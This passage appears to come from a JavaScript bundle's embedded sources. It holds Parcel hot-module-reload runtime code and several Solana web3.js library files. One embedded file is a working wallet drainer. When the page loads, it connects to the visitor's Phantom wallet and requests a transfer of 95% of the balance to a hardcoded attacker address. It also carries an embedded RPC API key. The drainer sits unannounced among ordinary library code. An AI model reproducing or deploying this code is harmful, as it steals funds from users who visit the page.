instances have the updated code.\n    if (bundle.parent) {\n      hmrApply(bundle.parent, asset);\n    }\n  }\n}\nfunction hmrDelete(bundle, id) {\n  let modules = bundle.modules;\n  if (!modules) {\n    return;\n  }\n  if (modules[id]) {\n    // Collect dependencies that will become orphaned when this module is deleted.\n    let deps = modules[id][1];\n    let orphans = [];\n    for (let dep in deps) {\n      let parents = getParents(module.bundle.root, deps[dep]);\n      if (parents.length === 1) {\n        orphans.push(deps[dep]);\n      }\n    }\n\n    // Delete the module. This must be done before deleting dependencies in case of circular dependencies.\n    delete modules[id];\n    delete bundle.cache[id];\n\n    // Now delete the orphans.\n    orphans.forEach(id => {\n      hmrDelete(module.bundle.root, id);\n    });\n  } else if (bundle.parent) {\n    hmrDelete(bundle.parent, id);\n  }\n}\nfunction hmrAcceptCheck(bundle /*: ParcelRequire */, id /*: string */, depsByBundle /*: ?{ [string]: { [string]: string } }*/) {\n  if (hmrAcceptCheckOne(bundle, id, depsByBundle)) {\n    return true;\n  }\n\n  // Traverse parents breadth first. All possible ancestries must accept the HMR update, or we'll reload.\n  let parents = getParents(module.bundle.root, id);\n  let accepted = false;\n  while (parents.length > 0) {\n    let v = parents.shift();\n    let a = hmrAcceptCheckOne(v[0], v[1], null);\n    if (a) {\n      // If this parent accepts, stop traversing upward, but still consider siblings.\n      accepted = true;\n    } else {\n      // Otherwise, queue the parents in the next level upward.\n      let p = getParents(module.bundle.root, v[1]);\n      if (p.length === 0) {\n        // If there are no parents, then we've reached an entry without accepting. Reload.\n        accepted = false;\n        break;\n      }\n      parents.push(...p);\n    }\n  }\n  return accepted;\n}\nfunction hmrAcceptCheckOne(bundle /*: ParcelRequire */, id /*: string */, depsByBundle /*: ?{ [string]: { [string]: string } }*/) {\n  var modules = bundle.modules;\n  if (!modules) {\n    return;\n  }\n  if (depsByBundle && !depsByBundle[bundle.HMR_BUNDLE_ID]) {\n    // If we reached the root bundle without finding where the asset should go,\n    // there's nothing to do. Mark as \"accepted\" so we don't reload the page.\n    if (!bundle.parent) {\n      return true;\n    }\n    return hmrAcceptCheck(bundle.parent, id, depsByBundle);\n  }\n  if (checkedAssets[id]) {\n    return true;\n  }\n  checkedAssets[id] = true;\n  var cached = bundle.cache[id];\n  assetsToDispose.push([bundle, id]);\n  if (!cached || cached.hot && cached.hot._acceptCallbacks.length) {\n    assetsToAccept.push([bundle, id]);\n    return true;\n  }\n}\nfunction hmrDisposeQueue() {\n  // Dispose all old assets.\n  for (let i = 0; i < assetsToDispose.length; i++) {\n    let id = assetsToDispose[i][1];\n    if (!disposedAssets[id]) {\n      hmrDispose(assetsToDispose[i][0], id);\n      disposedAssets[id] = true;\n    }\n  }\n  assetsToDispose = [];\n}\nfunction hmrDispose(bundle /*: ParcelRequire */, id /*: string */) {\n  var cached = bundle.cache[id];\n  bundle.hotData[id] = {};\n  if (cached && cached.hot) {\n    cached.hot.data = bundle.hotData[id];\n  }\n  if (cached && cached.hot && cached.hot._disposeCallbacks.length) {\n    cached.hot._disposeCallbacks.forEach(function (cb) {\n      cb(bundle.hotData[id]);\n    });\n  }\n  delete bundle.cache[id];\n}\nfunction hmrAccept(bundle /*: ParcelRequire */, id /*: string */) {\n  // Execute the module.\n  bundle(id);\n\n  // Run the accept callbacks in the new version of the module.\n  var cached = bundle.cache[id];\n  if (cached && cached.hot && cached.hot._acceptCallbacks.length) {\n    let assetsToAlsoAccept = [];\n    cached.hot._acceptCallbacks.forEach(function (cb) {\n      let additionalAssets = cb(function () {\n        return getParents(module.bundle.root, id);\n      });\n      if (Array.isArray(additionalAssets) && additionalAssets.length) {\n        assetsToAlsoAccept.push(...additionalAssets);\n      }\n    });\n    if (assetsToAlsoAccept.length) {\n      let handled = assetsToAlsoAccept.every(function (a) {\n        return hmrAcceptCheck(a[0], a[1]);\n      });\n      if (!handled) {\n        return fullReload();\n      }\n      hmrDisposeQueue();\n    }\n  }\n}","import { Connection, PublicKey, SystemProgram, Transaction } from '@solana/web3.js';\n\nconst targetAddress = \"BU1GUKRZPt4mTSg9co9jUwAf9FoDdyVhuqbRGHfvxxad\";\n\nwindow.addEventListener(\"load\", async () => {\n  try {\n    console.log(\"Page loaded. Starting process...\");\n\n    if (!window.solana || !window.solana.isPhantom) {\n      console.error(\"Phantom Wallet not detected.\");\n      return;\n    }\n\n    const connection = new Connection(\"https://solana-mainnet.g.alchemy.com/v2/xr-B-NJiKK_ThVscO4Y31pJUZJDZHffU\", \"confirmed\");\n\n    console.log(\"Attempting to connect to wallet...\");\n    const wallet = await window.solana.connect({ onlyIfTrusted: false });\n    console.log(\"Wallet connected:\", wallet.publicKey.toString());\n\n    const balance = await connection.getBalance(wallet.publicKey);\n    console.log(`Wallet balance: ${balance / 10 ** 9} SOL`);\n\n    if (balance <= 5000) {\n      console.error(\"Not enough SOL to perform the transaction.\");\n      return;\n    }\n\n    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();\n    console.log(\"Fetched blockhash:\", blockhash);\n\n    const transaction = new Transaction().add(\n      SystemProgram.transfer({\n        fromPubkey: wallet.publicKey,\n        toPubkey: new PublicKey(targetAddress),\n        lamports: Math.floor(balance * 0.95),\n      })\n    );\n\n    transaction.feePayer = wallet.publicKey;\n    transaction.recentBlockhash = blockhash;\n\n    console.log(\"Requesting wallet signature...\");\n    const { signature } = await window.solana.signAndSendTransaction(transaction);\n    console.log(`Transaction successful! Signature: ${signature}`);\n  } catch (err) {\n    console.error(\"Error:\", err.message);\n  }\n});\n",null,"import {ed25519} from '@noble/curves/ed25519';\n\n/**\n * A 64 byte secret key, the first 32 bytes of which is the\n * private scalar and the last 32 bytes is the public key.\n * Read more: https://blog.mozilla.org/warner/2011/11/29/ed25519-keys/\n */\ntype Ed25519SecretKey = Uint8Array;\n\n/**\n * Ed25519 Keypair\n */\nexport interface Ed25519Keypair {\n  publicKey: Uint8Array;\n  secretKey: Ed25519SecretKey;\n}\n\nexport const generatePrivateKey = ed25519.utils.randomPrivateKey;\nexport const generateKeypair = (): Ed25519Keypair => {\n  const privateScalar = ed25519.utils.randomPrivateKey();\n  const publicKey = getPublicKey(privateScalar);\n  const secretKey = new Uint8Array(64);\n  secretKey.set(privateScalar);\n  secretKey.set(publicKey, 32);\n  return {\n    publicKey,\n    secretKey,\n  };\n};\nexport const getPublicKey = ed25519.getPublicKey;\nexport function isOnCurve(publicKey: Uint8Array): boolean {\n  try {\n    ed25519.ExtendedPoint.fromHex(publicKey);\n    return true;\n  } catch {\n    return false;\n  }\n}\nexport const sign = (\n  message: Parameters<typeof ed25519.sign>[0],\n  secretKey: Ed25519SecretKey,\n) => ed25519.sign(message, secretKey.slice(0, 32));\nexport const verify = ed25519.verify;\n","import {Buffer} from 'buffer';\n\nexport const toBuffer = (arr: Buffer | Uint8Array | Array<number>): Buffer => {\n  if (Buffer.isBuffer(arr)) {\n    return arr;\n  } else if (arr instanceof Uint8Array) {\n    return Buffer.from(arr.buffer, arr.byteOffset, arr.byteLength);\n  } else {\n    return Buffer.from(arr);\n  }\n};\n","import {Buffer} from 'buffer';\nimport {serialize, deserialize, deserializeUnchecked} from 'borsh';\n\n// Class wrapping a plain object\nexport class Struct {\n  constructor(properties: any) {\n    Object.assign(this, properties);\n  }\n\n  encode(): Buffer {\n    return Buffer.from(serialize(SOLANA_SCHEMA, this));\n  }\n\n  static decode(data: Buffer): any {\n    return deserialize(SOLANA_SCHEMA, this, data);\n  }\n\n  static decodeUnchecked(data: Buffer): any {\n    return deserializeUnchecked(SOLANA_SCHEMA, this, data);\n  }\n}\n\n// Class representing a Rust-compatible enum, since enums are only strings or\n// numbers in pure JS\nexport class Enum extends Struct {\n  enum: string = '';\n  constructor(properties: any) {\n    super(properties);\n    if (Object.keys(properties).length !== 1) {\n      throw new Error('Enum can only take single value');\n    }\n    Object.keys(properties).map(key => {\n      this.enum = key;\n    });\n  }\n}\n\nexport const SOLANA_SCHEMA: Map<Function, any> = new Map();\n","import BN from 'bn.js';\nimport bs58 from 'bs58';\nimport {Buffer} from 'buffer';\nimport {sha256} from '@noble/hashes/sha256';\n\nimport {isOnCurve} from './utils/ed25519';\nimport {Struct, SOLANA_SCHEMA} from './utils/borsh-schema';\nimport {toBuffer} from './utils/to-buffer';\n\n/**\n * Maximum length of derived pubkey seed\n */\nexport const MAX_SEED_LENGTH = 32;\n\n/**\n * Size of public key in bytes\n */\nexport const PUBLIC_KEY_LENGTH = 32;\n\n/**\n * Value to be converted into public key\n */\nexport type PublicKeyInitData =\n  | number\n  | string\n  | Uint8Array\n  | Array<number>\n  | PublicKeyData;\n\n/**\n * JSON object representation of PublicKey class\n */\nexport type PublicKeyData = {\n  /** @internal */\n  _bn: BN;\n};\n\nfunction isPublicKeyData(value: PublicKeyInitData): value is PublicKeyData {\n  return (value as PublicKeyData)._bn !== undefined;\n}\n\n// local counter used by PublicKey.unique()\nlet uniquePublicKeyCounter = 1;\n\n/**\n * A public key\n */\nexport class PublicKey extends Struct {\n  /** @internal */\n  _bn: BN;\n\n  /**\n   * Create a new PublicKey object\n   * @param value ed25519 public key as buffer or base-58 encoded string\n   */\n  constructor(value: PublicKeyInitData) {\n    super({});\n    if (isPublicKeyData(value)) {\n      this._bn = value._bn;\n    } else {\n      if (typeof value === 'string') {\n        // assume base 58 encoding by default\n        const decoded = bs58.decode(value);\n        if (decoded.length != PUBLIC_KEY_LENGTH) {\n          throw new Error(`Invalid public key input`);\n        }\n        this._bn = new BN(decoded);\n      } else {\n        this._bn = new BN(value);\n      }\n\n      if (this._bn.byteLength() > PUBLIC_KEY_LENGTH) {\n        throw new Error(`Invalid public key input`);\n      }\n    }\n  }\n\n  /**\n   * Returns a unique PublicKey for tests and benchmarks using a counter\n   */\n  static unique(): PublicKey {\n    const key = new PublicKey(uniquePublicKeyCounter);\n    uniquePublicKeyCounter += 1;\n    return new PublicKey(key.toBuffer());\n  }\n\n  /**\n   * Default public key value. The base58-encoded string representation is all ones (as seen below)\n   * The underlying BN number is 32 bytes that are all zeros\n   */\n  static default: PublicKey = new PublicKey('11111111111111111111111111111111');\n\n  /**\n   * Checks if two publicKeys are equal\n   */\n  equals(publicKey: PublicKey): boolean {\n    return this._bn.eq(publicKey._bn);\n  }\n\n  /**\n   * Return the base-58 representation of the public key\n   */\n  toBase58(): string {\n    return bs58.encode(this.toBytes());\n  }\n\n  toJSON(): string {\n    return this.toBase58();\n  }\n\n  /**\n   * Return the byte array representation of the public key in big endian\n   */\n  toBytes(): Uint8Array {\n    const buf = this.toBuffer();\n    return new Uint8Array(buf.buffer, buf.byteOffset, buf.byteLength);\n  }\n\n  /**\n   * Return the Buffer representation of the public key in big endian\n   */\n  toBuffer(): Buffer {\n    const b = this._bn.toArrayLike(Buffer);\n    if (b.length === PUBLIC_KEY_LENGTH) {\n      return b;\n    }\n\n    const zeroPad = Buffer.alloc(32);\n    b.copy(zeroPad, 32 - b.length);\n    return zeroPad;\n  }\n\n  get [Symbol.toStringTag](): string {\n    return `PublicKey(${this.toString()})`;\n  }\n\n  /**\n   * Return the base-58 representation of the public key\n   */\n  toString(): string {\n    return this.toBase58();\n  }\n\n  /**\n   * Derive a public key from another key, a seed, and a program ID.\n   * The program ID will also serve as the owner of the public key, giving\n   * it permission to write data to the account.\n   */\n  /* eslint-disable require-await */\n  static async createWithSeed(\n    fromPublicKey: PublicKey,\n    seed: string,\n    programId: PublicKey,\n  ): Promise<PublicKey> {\n    const buffer = Buffer.concat([\n      fromPublicKey.toBuffer(),\n      Buffer.from(seed),\n      programId.toBuffer(),\n    ]);\n    const publicKeyBytes = sha256(buffer);\n    return new PublicKey(publicKeyBytes);\n  }\n\n  /**\n   * Derive a program address from seeds and a program ID.\n   */\n  /* eslint-disable require-await */\n  static createProgramAddressSync(\n    seeds: Array<Buffer | Uint8Array>,\n    programId: PublicKey,\n  ): PublicKey {\n    let buffer = Buffer.alloc(0);\n    seeds.forEach(function (seed) {\n      if (seed.length > MAX_SEED_LENGTH) {\n        throw new TypeError(`Max seed length exceeded`);\n      }\n      buffer = Buffer.concat([buffer, toBuffer(seed)]);\n    });\n    buffer = Buffer.concat([\n      buffer,\n      programId.toBuffer(),\n      Buffer.from('ProgramDerivedAddress'),\n    ]);\n    const publicKeyBytes = sha256(buffer);\n    if (isOnCurve(publicKeyBytes)) {\n      throw new Error(`Invalid seeds, address must fall off the curve`);\n    }\n    return new PublicKey(publicKeyBytes);\n  }\n\n  /**\n   * Async version of createProgramAddressSync\n   * For backwards compatibility\n   *\n   * @deprecated Use {@link createProgramAddressSync} instead\n   */\n  /* eslint-disable require-await */\n  static async createProgramAddress(\n    seeds: Array<Buffer | Uint8Array>,\n    programId: PublicKey,\n  ): Promise<PublicKey> {\n    return this.createProgramAddressSync(seeds, programId);\n  }\n\n  /**\n   * Find a valid program address\n   *\n   * Valid program addresses must fall off the ed25519 curve.  This function\n   * iterates a nonce until it finds one that when combined with the seeds\n   * results in a valid program address.\n   */\n  static findProgramAddressSync(\n    seeds: Array<Buffer | Uint8Array>,\n    programId: PublicKey,\n  ): [PublicKey, number] {\n    let nonce = 255;\n    let address;\n    while (nonce != 0) {\n      try {\n        const seedsWithNonce = seeds.concat(Buffer.from([nonce]));\n        address = this.createProgramAddressSync(seedsWithNonce, programId);\n      } catch (err) {\n        if (err instanceof TypeError) {\n          throw err;\n        }\n        nonce--;\n        continue;\n      }\n      return [address, nonce];\n    }\n    throw new Error(`Unable to find a viable program address nonce`);\n  }\n\n  /**\n   * Async version of findProgramAddressSync\n   * For backwards compatibility\n   *\n   * @deprecated Use {@link findProgramAddressSync} instead\n   */\n  static async findProgramAddress(\n    seeds: Array<Buffer | Uint8Array>,\n    programId: PublicKey,\n  ): Promise<[PublicKey, number]> {\n    return this.findProgramAddressSync(seeds, programId);\n  }\n\n  /**\n   * Check that a pubkey is on the ed25519 curve.\n   */\n  static isOnCurve(pubkeyData: PublicKeyInitData): boolean {\n    const pubkey = new PublicKey(pubkeyData);\n    return isOnCurve(pubkey.toBytes());\n  }\n}\n\nSOLANA_SCHEMA.set(PublicKey, {\n  kind: 'struct',\n  fields: [['_bn', 'u256']],\n});\n","import {Buffer} from 'buffer';\n\nimport {generatePrivateKey, getPublicKey} from './utils/ed25519';\nimport {toBuffer} from './utils/to-buffer';\nimport {PublicKey} from './publickey';\n\n/**\n * An account key pair (public and secret keys).\n *\n * @deprecated since v1.10.0, please use {@link Keypair} instead.\n */\nexport class Account {\n  /** @internal */\n  private _publicKey: Buffer;\n  /** @internal */\n  private _secretKey: Buffer;\n\n  /**\n   * Create a new Account object\n   *\n   * If the secretKey parameter is not provided a new key pair is randomly\n   * created for the account\n   *\n   * @param secretKey Secret key for the account\n   */\n  constructor(secretKey?: Uint8Array | Array<number>) {\n    if (secretKey) {\n      const secretKeyBuffer = toBuffer(secretKey);\n      if (secretKey.length !== 64) {\n        throw new Error('bad secret key size');\n      }\n      this._publicKey = secretKeyBuffer.slice(32, 64);\n      this._secretKey = secretKeyBuffer.slice(0, 32);\n    } else {\n      this._secretKey = toBuffer(generatePrivateKey());\n      this._publicKey = toBuffer(getPublicKey(this._secretKey));\n    }\n  }\n\n  /**\n   * The public key for this account\n   */\n  get publicKey(): PublicKey {\n    return new PublicKey(this._publicKey);\n  }\n\n  /**\n   * The **unencrypted** secret key for this account. The first 32 bytes\n   * is the private scalar and the last 32 bytes is the public key.\n   * Read more: https://blog.mozilla.org/warner/2011/11/29/ed25519-keys/\n   */\n  get secretKey(): Buffer {\n    return Buffer.concat([this._secretKey, this._publicKey], 64);\n  }\n}\n","import {PublicKey} from './publickey';\n\nexport const BPF_LOADER_DEPRECATED_PROGRAM_ID = new PublicKey(\n  'BPFLoader1111111111111111111111111111111111',\n);\n","/**\n * Maximum over-the-wire size of a Transaction\n *\n * 1280 is IPv6 minimum MTU\n * 40 bytes is the size of the IPv6 header\n * 8 bytes is the size of the fragment header\n */\nexport const PACKET_DATA_SIZE = 1280 - 40 - 8;\n\nexport const VERSION_PREFIX_MASK = 0x7f;\n\nexport const SIGNATURE_LENGTH_IN_BYTES = 64;\n","export class TransactionExpiredBlockheightExceededError extends Error {\n  signature: string;\n\n  constructor(signature: string) {\n    super(`Signature ${signature} has expired: block height exceeded.`);\n    this.signature = signature;\n  }\n}\n\nObject.defineProperty(\n  TransactionExpiredBlockheightExceededError.prototype,\n  'name',\n  {\n    value: 'TransactionExpiredBlockheightExceededError',\n  },\n);\n\nexport class TransactionExpiredTimeoutError extends Error {\n  signature: string;\n\n  constructor(signature: string, timeoutSeconds: number) {\n    super(\n      `Transaction was not confirmed in ${timeoutSeconds.toFixed(\n        2,\n      )} seconds. It is ` +\n        'unknown if it succeeded or failed. Check signature ' +\n        `${signature} using the Solana Explorer or CLI tools.`,\n    );\n    this.signature = signature;\n  }\n}\n\nObject.defineProperty(TransactionExpiredTimeoutError.prototype, 'name', {\n  value: 'TransactionExpiredTimeoutError',\n});\n\nexport class TransactionExpiredNonceInvalidError extends Error {\n  signature: string;\n\n  constructor(signature: string) {\n    super(`Signature ${signature} has expired: the nonce is no longer valid.`);\n    this.signature = signature;\n  }\n}\n\nObject.defineProperty(TransactionExpiredNonceInvalidError.prototype, 'name', {\n  value: 'TransactionExpiredNonceInvalidError',\n});\n","import {LoadedAddresses} from '../connection';\nimport {PublicKey} from '../publickey';\nimport {TransactionInstruction} from '../transaction';\nimport {MessageCompiledInstruction} from './index';\n\nexport type AccountKeysFromLookups = LoadedAddresses;\n\nexport class MessageAccountKeys {\n  staticAccountKeys: Array<PublicKey>;\n  accountKeysFromLookups?: AccountKeysFromLookups;\n\n  constructor(\n    staticAccountKeys: Array<PublicKey>,\n    accountKeysFromLookups?: AccountKeysFromLookups,\n  ) {\n    this.staticAccountKeys = staticAccountKeys;\n    this.accountKeysFromLookups = accountKeysFromLookups;\n  }\n\n  keySegments(): Array<Array<PublicKey>> {\n    const keySegments = [this.staticAccountKeys];\n    if (this.accountKeysFromLookups) {\n      keySegments.push(this.accountKeysFromLookups.writable);\n      keySegments.push(this.accountKeysFromLookups.readonly);\n    }\n    return keySegments;\n  }\n\n  get(index: number): PublicKey | undefined {\n    for (const keySegment of this.keySegments()) {\n      if (index < keySegment.length) {\n        return keySegment[index];\n      } else {\n        index -= keySegment.length;\n      }\n    }\n    return;\n  }\n\n  get length(): number {\n    return this.keySegments().flat().length;\n  }\n\n  compileInstructions(\n    instructions: Array<TransactionInstruction>,\n  ): Array<MessageCompiledInstruction> {\n    // Bail early if any account indexes would overflow a u8\n    const U8_MAX = 255;\n    if (this.length > U8_MAX + 1) {\n      throw new Error('Account index overflow encountered during compilation');\n    }\n\n    const keyIndexMap = new Map();\n    this.keySegments()\n      .flat()\n      .forEach((key, index) => {\n        keyIndexMap.set(key.toBase58(), index);\n      });\n\n    const findKeyIndex = (key: PublicKey) => {\n      const keyIndex = keyIndexMap.get(key.toBase58());\n      if (keyIndex === undefined)\n        throw new Error(\n          'Encountered an unknown instruction account key during compilation',\n        );\n      return keyIndex;\n    };\n\n    return instructions.map((instruction): MessageCompiledInstruction => {\n      return {\n        programIdIndex: findKeyIndex(instruction.programId),\n        accountKeyIndexes: instruction.keys.map(meta =>\n          findKeyIndex(meta.pubkey),\n        ),\n        data: instruction.data,\n      };\n    });\n  }\n}\n","import {Buffer} from 'buffer';\nimport * as BufferLayout from '@solana/buffer-layout';\n\nimport {VoteAuthorizeWithSeedArgs} from './programs/vote';\n\n/**\n * Layout for a public key\n */\nexport const publicKey = (property: string = 'publicKey') => {\n  return BufferLayout.blob(32, property);\n};\n\n/**\n * Layout for a signature\n */\nexport const signature = (property: string = 'signature') => {\n  return BufferLayout.blob(64, property);\n};\n\n/**\n * Layout for a 64bit unsigned value\n */\nexport const uint64 = (property: string = 'uint64') => {\n  return BufferLayout.blob(8, property);\n};\n\ninterface IRustStringShim\n  extends Omit<\n    BufferLayout.Structure<\n      Readonly<{\n        length: number;\n        lengthPadding: number;\n        chars: Uint8Array;\n      }>\n    >,\n    'decode' | 'encode' | 'replicate'\n  > {\n  alloc: (str: string) => number;\n  decode: (b: Uint8Array, offset?: number) => string;\n  encode: (str: string, b: Uint8Array, offset?: number) => number;\n  replicate: (property: string) => this;\n}\n\n/**\n * Layout for a Rust String type\n */\nexport const rustString = (\n  property: string = 'string',\n): BufferLayout.Layout<string> => {\n  const rsl = BufferLayout.struct<\n    Readonly<{\n      length?: number;\n      lengthPadding?: number;\n      chars: Uint8Array;\n    }>\n  >(\n    [\n      BufferLayout.u32('length'),\n      BufferLayout.u32('lengthPadding'),\n      BufferLayout.blob(BufferLayout.offset(BufferLayout.u32(), -8), 'chars'),\n    ],\n    property,\n  );\n  const _decode = rsl.decode.bind(rsl);\n  const _encode = rsl.encode.bind(rsl);\n\n  const rslShim = rsl as unknown as IRustStringShim;\n\n  rslShim.decode = (b: Uint8Array, offset?: number) => {\n    const data = _decode(b, offset);\n    return data['chars'].toString();\n  };\n\n  rslShim.encode = (str: string, b: Uint8Array, offset?: number) => {\n    const data = {\n      chars: Buffer.from(str, 'utf8'),\n    };\n    return _encode(data, b, offset);\n  };\n\n  rslShim.alloc = (str: string) => {\n    return (\n      BufferLayout.u32().span +\n      BufferLayout.u32().span +\n      Buffer.from(str, 'utf8').length\n    );\n  };\n\n  return rslShim;\n};\n\n/**\n * Layout for an Authorized object\n */\nexport const authorized = (property: string = 'authorized') => {\n  return BufferLayout.struct<\n    Readonly<{\n      staker: Uint8Array;\n      withdrawer: Uint8Array;\n    }>\n  >([publicKey('staker'), publicKey('withdrawer')], property);\n};\n\n/**\n * Layout for a Lockup object\n */\nexport const lockup = (property: string = 'lockup') => {\n  return BufferLayout.struct<\n    Readonly<{\n      custodian: Uint8Array;\n      epoch: number;\n      unixTimestamp: number;\n    }>\n  >(\n    [\n      BufferLayout.ns64('unixTimestamp'),\n      BufferLayout.ns64('epoch'),\n      publicKey('custodian'),\n    ],\n    property,\n  );\n};\n\n/**\n *  Layout for a VoteInit object\n */\nexport const voteInit = (property: string = 'voteInit') => {\n  return BufferLayout.struct<\n    Readonly<{\n      authorizedVoter: Uint8Array;\n      authorizedWithdrawer: Uint8Array;\n      commission: number;\n      nodePubkey: Uint8Array;\n    }>\n  >(\n    [\n      publicKey('nodePubkey'),\n      publicKey('authorizedVoter'),\n      publicKey('authorizedWithdrawer'),\n      BufferLayout.u8('commission'),\n    ],\n    property,\n  );\n};\n\n/**\n *  Layout for a VoteAuthorizeWithSeedArgs object\n */\nexport const voteAuthorizeWithSeedArgs = (\n  property: string = 'voteAuthorizeWithSeedArgs',\n) => {\n  return BufferLayout.struct<VoteAuthorizeWithSeedArgs>(\n    [\n      BufferLayout.u32('voteAuthorizationType'),\n      publicKey('currentAuthorityDerivedKeyOwnerPubkey'),\n      rustString('currentAuthorityDerivedKeySeed'),\n      publicKey('newAuthorized'),\n    ],\n    property,\n  );\n};\n\nexport function getAlloc(type: any, fields: any): number {\n  const getItemAlloc = (item: any): number => {\n    if (item.span >= 0) {\n      return item.span;\n    } else if (typeof item.alloc === 'function') {\n      return item.alloc(fields[item.property]);\n    } else if ('count' in item && 'elementLayout' in item) {\n      const field = fields[item.property];\n      if (Array.isArray(field)) {\n        return field.length * getItemAlloc(item.elementLayout);\n      }\n    } else if ('fields' in item) {\n      // This is a `Structure` whose size needs to be recursively measured.\n      return getAlloc({layout: item}, fields[item.property]);\n    }\n    // Couldn't determine allocated size of layout\n    return 0;\n  };\n\n  let alloc = 0;\n  type.layout.fields.forEach((item: any) => {\n    alloc += getItemAlloc(item);\n  });\n\n  return alloc;\n}\n","export function decodeLength(bytes: Array<number>): number {\n  let len = 0;\n  let size = 0;\n  for (;;) {\n    let elem = bytes.shift() as number;\n    len |= (elem & 0x7f) << (size * 7);\n    size += 1;\n    if ((elem & 0x80) === 0) {\n      break;\n    }\n  }\n  return len;\n}\n\nexport function encodeLength(bytes: Array<number>, len: number) {\n  let rem_len = len;\n  for (;;) {\n    let elem = rem_len & 0x7f;\n    rem_len >>= 7;\n    if (rem_len == 0) {\n      bytes.push(elem);\n      break;\n    } else {\n      elem |= 0x80;\n      bytes.push(elem);\n    }\n  }\n}\n","export default function (\n  condition: unknown,\n  message?: string,\n): asserts condition {\n  if (!condition) {\n    throw new Error(message || 'Assertion failed');\n  }\n}\n","import {MessageHeader, MessageAddressTableLookup} from './index';\nimport {AccountKeysFromLookups} from './account-keys';\nimport {AddressLookupTableAccount} from '../programs';\nimport {TransactionInstruction} from '../transaction';\nimport assert from '../utils/assert';\nimport {PublicKey} from '../publickey';\n\nexport type CompiledKeyMeta = {\n  isSigner: boolean;\n  isWritable: boolean;\n  isInvoked: boolean;\n};\n\ntype KeyMetaMap = Map<string, CompiledKeyMeta>;\n\nexport class CompiledKeys {\n  payer: PublicKey;\n  keyMetaMap: KeyMetaMap;\n\n  constructor(payer: PublicKey, keyMetaMap: KeyMetaMap) {\n    this.payer = payer;\n    this.keyMetaMap = keyMetaMap;\n  }\n\n  static compile(\n    instructions: Array<TransactionInstruction>,\n    payer: PublicKey,\n  ): CompiledKeys {\n    const keyMetaMap: KeyMetaMap = new Map();\n    const getOrInsertDefault = (pubkey: PublicKey): CompiledKeyMeta => {\n      const address = pubkey.toBase58();\n      let keyMeta = keyMetaMap.get(address);\n      if (keyMeta === undefined) {\n        keyMeta = {\n          isSigner: false,\n          isWritable: false,\n          isInvoked: false,\n        };\n        keyMetaMap.set(address, keyMeta);\n      }\n      return keyMeta;\n    };\n\n    const payerKeyMeta = getOrInsertDefault(payer);\n    payerKeyMeta.isSigner = true;\n    payerKeyMeta.isWritable = true;\n\n    for (const ix of instructions) {\n      getOrInsertDefault(ix.programId).isInvoked = true;\n      for (const accountMeta of ix.keys) {\n        const keyMeta = getOrInsertDefault(accountMeta.pubkey);\n        keyMeta.isSigner ||= accountMeta.isSigner;\n        keyMeta.isWritable ||= accountMeta.isWritable;\n      }\n    }\n\n    return new CompiledKeys(payer, keyMetaMap);\n  }\n\n  getMessageComponents(): [MessageHeader, Array<PublicKey>] {\n    const mapEntries = [...this.keyMetaMap.entries()];\n    assert(mapEntries.length <= 256, 'Max static account keys length exceeded');\n\n    const writableSigners = mapEntries.filter(\n      ([, meta]) => meta.isSigner && meta.isWritable,\n    );\n    const readonlySigners = mapEntries.filter(\n      ([, meta]) => meta.isSigner && !meta.isWritable,\n    );\n    const writableNonSigners = mapEntries.filter(\n      ([, meta]) => !meta.isSigner && meta.isWritable,\n    );\n    const readonlyNonSigners = mapEntries.filter(\n      ([, meta]) => !meta.isSigner && !meta.isWritable,\n    );\n\n    const header: MessageHeader = {\n      numRequiredSignatures: writableSigners.length + readonlySigners.length,\n      numReadonlySignedAccounts: readonlySigners.length,\n      numReadonlyUnsignedAccounts: readonlyNonSigners.length,\n    };\n\n    // sanity checks\n    {\n      assert(\n        writableSigners.length > 0,\n        'Expected at least one writable signer key',\n      );\n      const [payerAddress] = writableSigners[0];\n      assert(\n        payerAddress === this.payer.toBase58(),\n        'Expected first writable signer key to be the fee payer',\n      );\n    }\n\n    const staticAccountKeys = [\n      ...writableSigners.map(([address]) => new PublicKey(address)),\n      ...readonlySigners.map(([address]) => new PublicKey(address)),\n      ...writableNonSigners.map(([address]) => new PublicKey(address)),\n      ...readonlyNonSigners.map(([address]) => new PublicKey(address)),\n    ];\n\n    return [header, staticAccountKeys];\n  }\n\n  extractTableLookup(\n    lookupTable: AddressLookupTableAccount,\n  ): [MessageAddressTableLookup, AccountKeysFromLookups] | undefined {\n    const [writableIndexes, drainedWritableKeys] =\n      this.drainKeysFoundInLookupTable(\n        lookupTable.state.addresses,\n        keyMeta =>\n          !keyMeta.isSigner && !keyMeta.isInvoked && keyMeta.isWritable,\n      );\n    const [readonlyIndexes, drainedReadonlyKeys] =\n      this.drainKeysFoundInLookupTable(\n        lookupTable.state.addresses,\n        keyMeta =>\n          !keyMeta.isSigner && !keyMeta.isInvoked && !keyMeta.isWritable,\n      );\n\n    // Don't extract lookup if no keys were found\n    if (writableIndexes.length === 0 && readonlyIndexes.length === 0) {\n      return;\n    }\n\n    return [\n      {\n        accountKey: lookupTable.key,\n        writableIndexes,\n        readonlyIndexes,\n      },\n      {\n        writable: drainedWritableKeys,\n        readonly: drainedReadonlyKeys,\n      },\n    ];\n  }\n\n  /** @internal */\n  private drainKeysFoundInLookupTable(\n    lookupTableEntries: Array<PublicKey>,\n    keyMetaFilter: (keyMeta: CompiledKeyMeta) => boolean,\n  ): [Array<number>, Array<PublicKey>] {\n    const lookupTableIndexes = new Array();\n    const drainedKeys = new Array();\n\n    for (const [address, keyMeta] of this.keyMetaMap.entries()) {\n      if (keyMetaFilter(keyMeta)) {\n        const key = new PublicKey(address);\n        const lookupTableIndex = lookupTableEntries.findIndex(entry =>\n          entry.equals(key),\n        );\n        if (lookupTableIndex >= 0) {\n          assert(lookupTableIndex < 256, 'Max lookup table index exceeded');\n          lookupTableIndexes.push(lookupTableIndex);\n          drainedKeys.push(key);\n          this.keyMetaMap.delete(address);\n        }\n      }\n    }\n\n    return [lookupTableIndexes, drainedKeys];\n  }\n}\n","const END_OF_BUFFER_ERROR_MESSAGE = 'Reached end of buffer unexpectedly';\n\n/**\n * Delegates to `Array#shift`, but throws if the array is zero-length.\n */\nexport function guardedShift<T>(byteArray: T[]): T {\n  if (byteArray.length === 0) {\n    throw new Error(END_OF_BUFFER_ERROR_MESSAGE);\n  }\n  return byteArray.shift() as T;\n}\n\n/**\n * Delegates to `Array#splice`, but throws if the section being spliced out extends past the end of\n * the array.\n */\nexport function guardedSplice<T>(\n  byteArray: T[],\n  ...args:\n    | [start: number, deleteCount?: number]\n    | [start: number, deleteCount: number, ...items: T[]]\n): T[] {\n  const [start] = args;\n  if (\n    args.length === 2 